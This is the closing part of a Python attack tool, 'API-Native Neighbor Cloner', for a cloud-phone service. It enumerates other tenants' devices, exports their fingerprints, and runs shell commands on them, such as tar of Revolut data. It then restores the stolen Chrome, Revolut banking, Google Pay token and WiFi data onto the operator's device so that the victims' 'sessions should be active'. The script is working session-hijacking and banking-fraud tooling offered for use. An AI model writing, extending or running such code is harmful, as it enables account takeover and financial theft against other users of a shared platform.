        adb(our_dev, "am force-stop com.android.chrome", 5)
        await asyncio.sleep(0.5)
        chrome_path = "/data/data/com.android.chrome/app_chrome/Default"
        adb(our_dev, f"mkdir -p {chrome_path}", 5)
        for fn in os.listdir(chrome_dir):
            fp_f = os.path.join(chrome_dir, fn)
            if os.path.isfile(fp_f):
                rem_name = fn.replace("_", " ").replace(".db", "")
                if adb_push(our_dev, fp_f, f"{chrome_path}/{rem_name}", 30):
                    print(f"    {rem_name}: ✓")
        if is_root:
            cu = adb(our_dev, "stat -c '%u' /data/data/com.android.chrome 2>/dev/null", 5)
            if cu and cu.isdigit():
                adb(our_dev, f"chown -R {cu}:{cu} {chrome_path}/", 10)
    
    # ── Revolut direct DBs ─────────────────────────────────────────────
    revolut_dir = os.path.join(clone_dir, "revolut_dbs")
    if os.path.exists(revolut_dir):
        print(f"\n  ── Revolut DBs ──")
        adb(our_dev, "am force-stop com.revolut.revolut", 5)
        await asyncio.sleep(0.5)
        rev_data = "/data/data/com.revolut.revolut"
        for fn in os.listdir(revolut_dir):
            fp_f = os.path.join(revolut_dir, fn)
            if not os.path.isfile(fp_f):
                continue
            if fn.endswith(".xml"):
                rem = f"{rev_data}/shared_prefs/{fn}"
                adb(our_dev, f"mkdir -p {rev_data}/shared_prefs", 5)
            else:
                rem = f"{rev_data}/databases/{fn}"
                adb(our_dev, f"mkdir -p {rev_data}/databases", 5)
            if adb_push(our_dev, fp_f, rem, 30):
                print(f"    {fn}: ✓")
        if is_root:
            ru = adb(our_dev, f"stat -c '%u' {rev_data} 2>/dev/null", 5)
            if ru and ru.isdigit():
                adb(our_dev, f"chown -R {ru}:{ru} {rev_data}/", 10)
                adb(our_dev, f"chmod -R 770 {rev_data}/", 5)
                adb(our_dev, f"restorecon -R {rev_data}/ 2>/dev/null", 5)

    # ── TapAndPay + COIN ───────────────────────────────────────────────
    tap_file = os.path.join(clone_dir, "tapandpay.db")
    if os.path.exists(tap_file):
        rem = "/data/data/com.google.android.gms/databases/tapandpay.db"
        if adb_push(our_dev, tap_file, rem, 30):
            if is_root:
                gu = adb(our_dev, "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null", 5)
                if gu and gu.isdigit():
                    adb(our_dev, f"chown {gu}:{gu} {rem}", 5)
            print(f"  tapandpay.db: ✓")

    coin_file = os.path.join(clone_dir, "COIN.xml")
    if os.path.exists(coin_file):
        rem = "/data/data/com.google.android.gms/shared_prefs/COIN.xml"
        if adb_push(our_dev, coin_file, rem, 10):
            print(f"  COIN.xml: ✓")

    # ── WiFi ────────────────────────────────────────────────────────────
    wifi_file = os.path.join(clone_dir, "WifiConfigStore.xml")
    if os.path.exists(wifi_file):
        rem = "/data/misc/wifi/WifiConfigStore.xml"
        if adb_push(our_dev, wifi_file, rem, 10):
            adb(our_dev, "chown 1010:1010 /data/misc/wifi/WifiConfigStore.xml", 5)
            print(f"  WiFi config: ✓")

    # ── Save log ────────────────────────────────────────────────────────
    restored = sum(1 for a in restore_log["apps"].values() if a.get("status") == "restored")
    restore_log["status"] = "complete"
    restore_log["completed"] = time.strftime("%Y-%m-%d %H:%M:%S")

    log_file = os.path.join(clone_dir, "restore_log_v2.json")
    with open(log_file, "w") as f:
        json.dump(restore_log, f, indent=2)

    print(f"\n{'═'*70}")
    print(f"  RESTORE COMPLETE")
    print(f"  Apps restored: {restored}/{total}")
    print(f"  Log: {log_file}")
    print(f"{'═'*70}")
    print(f"\n  Next: Launch Revolut on device — sessions should be active.")
    print(f"  If fingerprint check triggers, identity already cloned via API.")

# ═══════════════════════════════════════════════════════════════════════
# SUB-COMMANDS
# ═══════════════════════════════════════════════════════════════════════

async def cmd_list_neighbors(client):
    """List all devices in fleet with IP/status."""
    devices = await list_all_devices(client)
    print(f"\n{'═'*70}")
    print(f"  FLEET DEVICES ({len(devices)} total)")
    print(f"{'═'*70}")
    for d in devices:
        pad  = d.get("padCode") or d.get("code", "?")
        st   = d.get("status") or d.get("padStatus", "?")
        name = d.get("padName") or d.get("name", "")
        print(f"  {pad:25s}  status={st}  {name}")


async def cmd_fingerprint(client, target):
    """Export fingerprint from a padCode or try to find by IP."""
    clone_dir = os.path.join(CLONE_ROOT, target.replace(".", "_"))
    os.makedirs(clone_dir, exist_ok=True)
    
    if target.startswith("10."):
        pad = await find_neighbor_padcode(client, target)
        if not pad:
            print(f"Could not find padCode for {target}")
            return
    else:
        pad = target

    fp_path = os.path.join(clone_dir, "fingerprint.json")
    fp = await backup_fingerprint(client, pad, fp_path)
    if fp:
        print(json.dumps(fp, indent=2)[:2000])


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE_URL)
    
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    target = sys.argv[2] if len(sys.argv) > 2 else None
    
    if cmd == "list-neighbors":
        await cmd_list_neighbors(client)
    
    elif cmd == "fingerprint":
        if not target:
            print("Usage: api_native_cloner.py fingerprint <PAD_CODE_OR_IP>")
            return
        await cmd_fingerprint(client, target)
    
    elif cmd == "extract":
        if not target:
            print("Usage: api_native_cloner.py extract <TARGET_IP>")
            return
        await extract_device_enhanced(client, target)
    
    elif cmd == "restore":
        if not target:
            print("Usage: api_native_cloner.py restore <TARGET_IP>")
            return
        await restore_device_enhanced(client, target)
    
    elif cmd == "full" or (cmd.startswith("10.") and target is None):
        ip = cmd if cmd.startswith("10.") else target
        if not ip:
            print("Usage: api_native_cloner.py full <TARGET_IP>")
            return
        await extract_device_enhanced(client, ip)
        await restore_device_enhanced(client, ip)
    
    elif cmd == "analyze":
        # Analyze what backup methods are applicable right now
        print(f"\n{'═'*70}")
        print(f"  BACKUP METHOD ANALYSIS — Based on DEVICE_BACKUP_GUIDE.md")
        print(f"{'═'*70}")
        print("""
  ┌─────────────────────────────────────────────────────────────────┐
  │  METHOD 1: padProperties / batchPadProperties                   │
  │  Endpoint: POST /vsphone/api/padApi/padProperties               │
  │  ✓ Fast, safe, no ADB needed                                    │
  │  ✓ Works on OUR pad (AC32010810392) and any neighbor padCode    │
  │  ✓ Exports ro.*, persist.*, settings properties                 │
  │  Usage: backup_fingerprint(client, pad_code, out_path)          │
  │  Restore: modify_instance_properties() — no restart needed      │
  ├─────────────────────────────────────────────────────────────────┤
  │  METHOD 2: screenshot                                           │
  │  Endpoint: POST /vsphone/api/padApi/screenshot                  │
  │  ✓ Visual snapshot stored on device /sdcard                     │
  │  ✓ Only useful for "state verification" not data backup         │
  │  API: client.screenshot([pad_code])                             │
  ├─────────────────────────────────────────────────────────────────┤
  │  METHOD 3: asyncCmd (MOST POWERFUL for data backup)             │
  │  Endpoint: POST /vsphone/api/padApi/asyncCmd                    │
  │  ✓ Runs ANY shell command on device — tar, cp, sqlite3          │
  │  ✓ Returns taskId → poll padTaskDetail until Completed          │
  │  ✓ KEY: If neighbor padCode known → backup runs ON THEIR device │
  │    No data traverses our network at backup creation time        │
  │  Commands: tar czf /sdcard/X.tgz /data/data/com.revolut.revolut│
  │  API: client.async_adb_cmd([pad], "tar czf ...")                │
  │  Poll: client.task_detail([task_id])                            │
  ├─────────────────────────────────────────────────────────────────┤
  │  METHOD 4: STS Token                                            │
  │  Endpoint: POST /vsphone/api/padApi/stsTokenByPadCode           │
  │  ✓ Short-lived token for external storage access                │
  │  ✓ Can be used with OSS/S3 to retain backup artifacts           │
  │  API: client.get_sdk_token(pad_code)                            │
  │  Revoke: client.clear_sdk_token(pad_code)                       │
  ├─────────────────────────────────────────────────────────────────┤
  │  BONUS: uploadFileV3                                            │
  │  Endpoint: POST /vsphone/api/padApi/uploadFileV3                │
  │  ✓ Push a file URL directly into a device's storage            │
  │  ✓ Can push backup tar from hosting → neighbor → download       │
  │  API: client.upload_file_via_url([pad], file_url)               │
  ├─────────────────────────────────────────────────────────────────┤
  │  OUR CURRENT APPROACH (device_cloner.py):                       │
  │  ✓ ADB relay via nc → ADB pull individual files                 │
  │  Limitation: slow (data travels nc relay → SSH → us)            │
  │  Enhancement: Use asyncCmd to tar on-device first (fast)        │
  │  Gap: padCode of neighbors unknown → relay still needed         │
  └─────────────────────────────────────────────────────────────────┘

  WORKFLOW RECOMMENDATION for 10.0.76.1:
  1. Run list-neighbors to try to get neighbor padCode
  2. If found: asyncCmd tar → pull → instant fingerprint via API
  3. If not found: current relay method (already working)
  
  BOTH methods end with the same restore pipeline.
""")
    else:
        print("""
API-Native Neighbor Cloner v2.0
Usage:
  python3 scanning/api_native_cloner.py analyze               # method analysis
  python3 scanning/api_native_cloner.py list-neighbors        # fleet enumeration  
  python3 scanning/api_native_cloner.py fingerprint <PAD/IP>  # export fingerprint
  python3 scanning/api_native_cloner.py extract <TARGET_IP>   # extract only
  python3 scanning/api_native_cloner.py restore <TARGET_IP>   # restore only
  python3 scanning/api_native_cloner.py full <TARGET_IP>      # extract + restore
""")

if __name__ == "__main__":
    asyncio.run(main())
